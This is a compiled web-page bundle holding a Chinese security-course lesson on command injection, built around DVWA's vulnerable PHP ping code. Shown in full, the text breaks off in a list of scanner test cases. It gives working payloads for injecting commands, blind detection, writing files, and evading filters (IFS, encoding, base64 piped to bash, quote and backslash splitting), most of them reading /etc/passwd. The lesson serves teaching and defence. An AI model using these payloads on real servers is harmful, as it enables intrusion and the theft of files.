import{_ as o,D as e,o as t,g as c,J as p,h as a,Q as l,m as s}from"./chunks/framework.f67d7268.js";const P=JSON.parse('{"title":"14命令与代码注入：常令安全人员半夜应急的漏洞","description":"","frontmatter":{},"headers":[],"relativePath":"posts/devops/Web 安全攻防之道_文档/(5982) 14  命令与代码注入：常令安全人员半夜应急的漏洞.md","filePath":"posts/devops/Web 安全攻防之道_文档/(5982) 14  命令与代码注入：常令安全人员半夜应急的漏洞.md","lastUpdated":1696682708000}'),r={name:"posts/devops/Web 安全攻防之道_文档/(5982) 14  命令与代码注入：常令安全人员半夜应急的漏洞.md"},y=l(`<h1 id="_14命令与代码注入-常令安全人员半夜应急的漏洞" tabindex="-1">14命令与代码注入：常令安全人员半夜应急的漏洞 <a class="header-anchor" href="#_14命令与代码注入-常令安全人员半夜应急的漏洞" aria-label="Permalink to &quot;14命令与代码注入：常令安全人员半夜应急的漏洞&quot;">​</a></h1><p>上一讲介绍了文件上传漏洞的攻防原理，利用可能直接控制服务器，危害严重。</p><p>本节课再给大家介绍一种叫命令注入的严重漏洞，由于它也能直接控制服务器，因此常令企业安全人员半夜应急。</p><p>为何是半夜呢？因为搞站的人经常是晚上下班后开搞，也专业挑安全人员下班的时间，减少被发现和阻断的情况。</p><h3 id="命令注入漏洞成因" tabindex="-1">命令注入漏洞成因 <a class="header-anchor" href="#命令注入漏洞成因" aria-label="Permalink to &quot;命令注入漏洞成因&quot;">​</a></h3><p>命令注入，主要指应用在服务器或客户端上，允许拼接系统命令并执行而造成的漏洞。对于 web 网站，通常是针对服务器的攻击利用。</p><p>PHP 中常见的系统命令执行函数有：</p><ul><li><p>system()</p></li><li><p>exec()</p></li><li><p>shell_ exec()</p></li><li><p>proc_open()</p></li><li><p>popen()</p></li><li><p>passthru()</p></li><li><p>......</p></li></ul><p>如果外部用户的输入数据（如 GET、POST、Cookie 等数据）未做任何过滤或转义，直接转递给上述命令执行函数，就会造成命令注入漏洞。</p><p>总结下形成命令注入漏洞的条件：</p><ul><li><p>内部存在命令执行函数的调用</p></li><li><p>用户输入数据作为参数传递给命令执行函数</p></li><li><p>输入参数未做任何过滤或转义</p></li></ul><h3 id="漏洞利用实战" tabindex="-1">漏洞利用实战 <a class="header-anchor" href="#漏洞利用实战" aria-label="Permalink to &quot;漏洞利用实战&quot;">​</a></h3><h4 id="_1-命令拼接技巧" tabindex="-1">1.命令拼接技巧 <a class="header-anchor" href="#_1-命令拼接技巧" aria-label="Permalink to &quot;1.命令拼接技巧&quot;">​</a></h4><p>注入命令过程中，常常需要使用一些系统命令的拼接方式，以达到更多复杂功能的实现，尤其是存在限制的情况，运用好可用来绕过限制。</p><p>常用拼接符号如下。</p><ul><li><strong>&amp;&amp;</strong></li></ul><p>命令格式：cmd1 &amp;&amp; cmd2，cmd1 执行成功后才会执行 cmd2。</p><ul><li><strong>|</strong></li></ul><p>命令格式：cmd1 | cmd2，cmd1 的执行结果传递给 cmd2 去执行。</p><ul><li><strong>||</strong></li></ul><p>命令格式：cmd1 || cmd2，cmd1 执行失败后就执行 cmd2。</p><ul><li><strong>&amp;</strong></li></ul><p>命令格式：cmd1 &amp; cmd2，&amp; 用于分隔多个命令，命令按顺序 cmd1、cmd2 执行。</p><ul><li><strong>;</strong></li></ul><p>命令格式：cmd1 ; cmd2，分号用于分隔多个命令去执行，命令按顺序 cmd1、cmd2 执行。</p><ul><li><strong>\`\`</strong></li></ul><p>命令格式：<code>cmd</code>，注意这里是对反斜号，代表命令执行结果的输出，即命令替换。</p><ul><li><strong>$()</strong></li></ul><p>命令格式：$(cmd)，用于命令替换，适用于 cmd 中需要使用多个拼接符。</p><ul><li><strong>()</strong></li></ul><p>命令格式：(cmd1;cmd2)，合并多个命令，重新开启子 shell 来执行命令。</p><ul><li><strong>{}</strong></li></ul><p>命令格式：{cmd,arg}，Linux bash 下用于合并多个命令及参数，在当前 shell 执行。</p><h4 id="_2-靶场演练" tabindex="-1">2.靶场演练 <a class="header-anchor" href="#_2-靶场演练" aria-label="Permalink to &quot;2.靶场演练&quot;">​</a></h4><p>以 DVWA 靶场的命令注入题目为例，漏洞代码如下。</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">( </span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">( $_POST[ </span><span style="color:#9ECBFF;">&#39;Submit&#39;</span><span style="color:#E1E4E8;"> ]  ) ) {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Get input</span></span>
<span class="line"><span style="color:#E1E4E8;">    $target </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> $_REQUEST[ </span><span style="color:#9ECBFF;">&#39;ip&#39;</span><span style="color:#E1E4E8;"> ];</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Determine OS and execute the ping command.</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">( </span><span style="color:#79B8FF;">stristr</span><span style="color:#E1E4E8;">( </span><span style="color:#79B8FF;">php_uname</span><span style="color:#E1E4E8;">( </span><span style="color:#9ECBFF;">&#39;s&#39;</span><span style="color:#E1E4E8;"> ), </span><span style="color:#9ECBFF;">&#39;Windows NT&#39;</span><span style="color:#E1E4E8;"> ) ) {</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">// Windows</span></span>
<span class="line"><span style="color:#E1E4E8;">        $cmd </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">shell_exec</span><span style="color:#E1E4E8;">( </span><span style="color:#9ECBFF;">&#39;ping  &#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;"> $target );</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">// *nix</span></span>
<span class="line"><span style="color:#E1E4E8;">        $cmd </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">shell_exec</span><span style="color:#E1E4E8;">( </span><span style="color:#9ECBFF;">&#39;ping  -c 4 &#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;"> $target );</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Feedback for the end user</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;pre&gt;{</span><span style="color:#E1E4E8;">$cmd</span><span style="color:#9ECBFF;">}&lt;/pre&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">( </span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">( $_POST[ </span><span style="color:#032F62;">&#39;Submit&#39;</span><span style="color:#24292E;"> ]  ) ) {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Get input</span></span>
<span class="line"><span style="color:#24292E;">    $target </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> $_REQUEST[ </span><span style="color:#032F62;">&#39;ip&#39;</span><span style="color:#24292E;"> ];</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Determine OS and execute the ping command.</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">( </span><span style="color:#005CC5;">stristr</span><span style="color:#24292E;">( </span><span style="color:#005CC5;">php_uname</span><span style="color:#24292E;">( </span><span style="color:#032F62;">&#39;s&#39;</span><span style="color:#24292E;"> ), </span><span style="color:#032F62;">&#39;Windows NT&#39;</span><span style="color:#24292E;"> ) ) {</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6A737D;">// Windows</span></span>
<span class="line"><span style="color:#24292E;">        $cmd </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">shell_exec</span><span style="color:#24292E;">( </span><span style="color:#032F62;">&#39;ping  &#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">.</span><span style="color:#24292E;"> $target );</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6A737D;">// *nix</span></span>
<span class="line"><span style="color:#24292E;">        $cmd </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">shell_exec</span><span style="color:#24292E;">( </span><span style="color:#032F62;">&#39;ping  -c 4 &#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">.</span><span style="color:#24292E;"> $target );</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Feedback for the end user</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;pre&gt;{</span><span style="color:#24292E;">$cmd</span><span style="color:#032F62;">}&lt;/pre&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>它在获取用户输入的 IP 地址后直接传递给 shell_exec 函数去执行，如果我们利用前面介绍的命令拼接方式去注入其他命令就可以被执行，比如通过分号输入以下命令：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#79B8FF;">127.0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">1</span><span style="color:#E1E4E8;">; id</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#005CC5;">127.0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">1</span><span style="color:#24292E;">; id</span></span></code></pre></div><p>提交后可以看到 id 命令的执行结果，说明命令注入成功。</p>`,39),E=l(`<p>图 1 利用漏洞执行命令 id</p><p>其他连接符号的利用，你也可以尝试下。</p><p>此处是有回显内容的，若无回显就需要使用一些盲注技巧，比如 sleep 延时命令：</p><pre><code>127.0.0.1 &amp;&amp; sleep 5
</code></pre><p>也可使用输出重定向符号&quot;&gt;&quot;与&quot;&gt;&gt;&quot;，输出内容到指定文件，然后访问对应文件是否存在，比如：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#79B8FF;">127.0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">1</span><span style="color:#E1E4E8;">; echo </span><span style="color:#9ECBFF;">&quot;test&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> test.</span><span style="color:#B392F0;">txt</span><span style="color:#E1E4E8;"> (由于靶场环境限制无法在网站根目录创建文件，所以此用例不会成功)</span></span>
<span class="line"><span style="color:#79B8FF;">127.0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">1</span><span style="color:#E1E4E8;">; echo </span><span style="color:#9ECBFF;">&#39;test&#39;</span><span style="color:#F97583;">&gt;/</span><span style="color:#E1E4E8;">app</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">hackable</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">uploads</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">text.txt</span></span>
<span class="line"><span style="color:#E1E4E8;">提交上述用例后，访问http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1/hackable/uploads/text.txt即可看到输出成功</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#005CC5;">127.0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">1</span><span style="color:#24292E;">; echo </span><span style="color:#032F62;">&quot;test&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> test.</span><span style="color:#6F42C1;">txt</span><span style="color:#24292E;"> (由于靶场环境限制无法在网站根目录创建文件，所以此用例不会成功)</span></span>
<span class="line"><span style="color:#005CC5;">127.0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">1</span><span style="color:#24292E;">; echo </span><span style="color:#032F62;">&#39;test&#39;</span><span style="color:#D73A49;">&gt;/</span><span style="color:#24292E;">app</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">hackable</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">uploads</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">text.txt</span></span>
<span class="line"><span style="color:#24292E;">提交上述用例后，访问http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1/hackable/uploads/text.txt即可看到输出成功</span></span></code></pre></div><p>执行效果如图 2 所示。</p>`,7),i=l('<p>图 2 注入命令写文件成功</p><p>还有访问自己的服务器，看日志判断是否命令执行成功，比较便捷的方式就是使用 BurpSuit Collaborator ，在诸多盲注场景下它都适用。</p><h4 id="_3-常用的限制绕过技巧" tabindex="-1">3.常用的限制绕过技巧 <a class="header-anchor" href="#_3-常用的限制绕过技巧" aria-label="Permalink to &quot;3.常用的限制绕过技巧&quot;">​</a></h4><p><strong>（1）绕过单命令限制</strong></p><p>命令注入点有时是某一执行程序的参数，比如 ls 命令，注入再多的参数也难达到控制服务器的目的，此时我们就需要采用多命令注入方式，你可以回头再看下刚刚讲的命令拼接技巧中介绍的各种方法。</p><p><strong>（2）空格绕过</strong></p><p>有时会遇到对输入命令参数进行空格过滤，比如输入命令：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">cat </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">cat </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd;</span></span></code></pre></div><p>就会变成：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">cat</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">cat</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd;</span></span></code></pre></div><p>导致执行失败。</p><p>你可以尝试以下几种方法去绕过。</p><ul><li><strong>IFS 分隔符</strong></li></ul><p>IFS（Internal Field Seperator，内部域分隔符）是 shell 下的特殊环境变量，可以是空格、Tab、换行符或者其他自定义符号，如图 3 利用 IFS 分隔符成功读取到敏感文件。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">cat$IFS</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">cat$IFS</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd</span></span></code></pre></div>',15),d=l(`<p>图 3 利用 IFS 分隔符绕过空格限制</p><ul><li><strong>URL 编码</strong></li></ul><p>可以在请求参数中用 ％20、+、%09(tab) 等方式来绕过：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">cat</span><span style="color:#F97583;">%</span><span style="color:#79B8FF;">20</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd</span></span>
<span class="line"><span style="color:#E1E4E8;">cat</span><span style="color:#F97583;">+/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd</span></span>
<span class="line"><span style="color:#E1E4E8;">cat</span><span style="color:#F97583;">%</span><span style="color:#E1E4E8;">09</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">cat</span><span style="color:#D73A49;">%</span><span style="color:#005CC5;">20</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd</span></span>
<span class="line"><span style="color:#24292E;">cat</span><span style="color:#D73A49;">+/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd</span></span>
<span class="line"><span style="color:#24292E;">cat</span><span style="color:#D73A49;">%</span><span style="color:#24292E;">09</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd</span></span></code></pre></div><ul><li><strong>{cmd,arg}</strong></li></ul><p>在 Linux bash 环境中可以使用花括号 {cmd,arg} 扩展来绕过：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">{cat,etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd}</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">{cat,etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd}</span></span></code></pre></div><p>这个依赖 bash 环境，并不是那么通用的方式，比如在 DVWA 靶场中就不适用。<br><strong>（3）黑名单绕过</strong></p><p>绕过黑名单就是先探测哪些是黑名单，尽量避开不用，如果还不行可以考虑以下方法。</p><ul><li><strong>shell 特殊变量</strong></li></ul><p>先看下 shell 中的一些特殊变量：</p>`,11),F=l(`<p>比如 cat 命令被禁，利用上述特殊变量，我们就可以这样构造来绕过：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">ca$1t </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd</span></span>
<span class="line"><span style="color:#E1E4E8;">cat$</span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;">t </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd</span></span>
<span class="line"><span style="color:#E1E4E8;">ca$@</span><span style="color:#F97583;">t</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">ca$1t </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd</span></span>
<span class="line"><span style="color:#24292E;">cat$</span><span style="color:#D73A49;">*</span><span style="color:#24292E;">t </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd</span></span>
<span class="line"><span style="color:#24292E;">ca$@</span><span style="color:#D73A49;">t</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd</span></span></code></pre></div><ul><li><strong>编码绕过</strong></li></ul><p>直接将命令字符串转换成 URL 编码、hex 码、base 64 等编码，再转换回来执行：</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;"># Base64编码命令&quot;cat /etc/passwd&quot;</span></span>
<span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;Y2F0IC9ldGMvcGFzc3dk&quot;</span><span style="color:#F97583;">|</span><span style="color:#B392F0;">base64</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-d</span><span style="color:#F97583;">|</span><span style="color:#B392F0;">bash</span></span>
<span class="line"><span style="color:#6A737D;"># Hex编码命令&quot;cat /etc/passwd&quot;</span></span>
<span class="line"><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;636174202f6574632f706173737764&quot;</span><span style="color:#F97583;">|</span><span style="color:#B392F0;">xxd</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-r</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-p</span><span style="color:#F97583;">|</span><span style="color:#B392F0;">bash</span></span>
<span class="line"><span style="color:#9ECBFF;">$(</span><span style="color:#79B8FF;">printf</span><span style="color:#9ECBFF;"> &quot;\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64&quot;)</span></span>
<span class="line"><span style="color:#6A737D;"># URL编码</span></span>
<span class="line"><span style="color:#B392F0;">cat%20%2Fetc%2Fpasswd</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;"># Base64编码命令&quot;cat /etc/passwd&quot;</span></span>
<span class="line"><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;Y2F0IC9ldGMvcGFzc3dk&quot;</span><span style="color:#D73A49;">|</span><span style="color:#6F42C1;">base64</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-d</span><span style="color:#D73A49;">|</span><span style="color:#6F42C1;">bash</span></span>
<span class="line"><span style="color:#6A737D;"># Hex编码命令&quot;cat /etc/passwd&quot;</span></span>
<span class="line"><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;636174202f6574632f706173737764&quot;</span><span style="color:#D73A49;">|</span><span style="color:#6F42C1;">xxd</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-r</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-p</span><span style="color:#D73A49;">|</span><span style="color:#6F42C1;">bash</span></span>
<span class="line"><span style="color:#032F62;">$(</span><span style="color:#005CC5;">printf</span><span style="color:#032F62;"> &quot;\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64&quot;)</span></span>
<span class="line"><span style="color:#6A737D;"># URL编码</span></span>
<span class="line"><span style="color:#6F42C1;">cat%20%2Fetc%2Fpasswd</span></span></code></pre></div><ul><li><strong>变量自定义</strong></li></ul><p>将黑名单内容拆分到不同的变量，再拼接起来执行。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">a</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">c;b</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">at;c</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;/etc/passwd&quot;</span><span style="color:#E1E4E8;">;$a$b $c</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">a</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">c;b</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">at;c</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;/etc/passwd&quot;</span><span style="color:#24292E;">;$a$b $c</span></span></code></pre></div><ul><li><strong>反斜杠</strong></li></ul><p>反斜杠的作用就是转义，因此可用来拆分黑名单字符串，但又不影响结果。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">c\\a\\t </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">et\\c</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">pas\\s\\wd</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">c\\a\\t </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">et\\c</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">pas\\s\\wd</span></span></code></pre></div><ul><li><strong>单双引号</strong></li></ul><p>单双引号内的内容会被当作字符串处理，跟其他字符串可拼接出我们需要的命令行字符串。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">c</span><span style="color:#9ECBFF;">&quot;a&quot;</span><span style="color:#E1E4E8;">t </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">et</span><span style="color:#9ECBFF;">&#39;&#39;</span><span style="color:#E1E4E8;">c</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">p</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">sswd</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">c</span><span style="color:#032F62;">&quot;a&quot;</span><span style="color:#24292E;">t </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">et</span><span style="color:#032F62;">&#39;&#39;</span><span style="color:#24292E;">c</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">p</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">sswd</span></span></code></pre></div><h3 id="挖掘命令注入漏洞" tabindex="-1">挖掘命令注入漏洞 <a class="header-anchor" href="#挖掘命令注入漏洞" aria-label="Permalink to &quot;挖掘命令注入漏洞&quot;">​</a></h3><h4 id="_1-代码审计" tabindex="-1">1.代码审计 <a class="header-anchor" href="#_1-代码审计" aria-label="Permalink to &quot;1.代码审计&quot;">​</a></h4><p>代码审计思路就是追踪污点（用户可控数据，如 Get、Post 数据等等）的传播，看是否未经限制就传递给命令执行函数（system、exec、shell_ exec 等等）。</p><h4 id="_2-黑盒扫描" tabindex="-1">2.黑盒扫描 <a class="header-anchor" href="#_2-黑盒扫描" aria-label="Permalink to &quot;2.黑盒扫描&quot;">​</a></h4><p>通过漏洞扫描器来检测漏洞，对用户输入参数去构造一些命令，然后检测返回结果，最常用的无害命令就是 sleep 函数，看延时情况来判断是否执行成功，无论执行结果有无回显，均可适用。</p><p>一些常用的 Linux 平台的命令注入测试用例如下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">lt;</span><span style="color:#F97583;">!--</span><span style="color:#E1E4E8;">#exec</span><span style="color:#F97583;">%</span><span style="color:#E1E4E8;">20cmd</span><span style="color:#F97583;">=&amp;</span><span style="color:#E1E4E8;">quot;</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">cat</span><span style="color:#F97583;">%</span><span style="color:#79B8FF;">20</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">passwd</span><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">quot;</span><span style="color:#F97583;">--&amp;</span><span style="color:#E1E4E8;">gt;</span></span>
